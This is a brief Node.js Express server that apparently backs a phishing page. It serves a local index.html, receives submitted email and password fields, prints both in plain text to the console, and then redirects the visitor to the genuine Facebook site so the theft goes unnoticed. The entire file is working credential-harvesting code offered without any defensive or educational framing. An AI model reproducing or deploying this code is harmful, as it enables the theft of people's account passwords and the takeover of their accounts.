const express = require("express")
const bodyParser = require("body-parser")
app = express()

app.use(bodyParser.urlencoded({extended: true}))

app.use(express.static(__dirname))

app.get("/", function (req,res){
    res.sendFile(__dirname+"/index.html")
})

app.post("/", function(req, res){
    var email = req.body.email;
    var password = req.body.pass;
    console.log("Email: "+ email)
    console.log("Password: "+ password)
    res.redirect("https://en-gb.facebook.com/")
})

app.listen(3000, function(){
    console.log("Server is online on port 3000")
})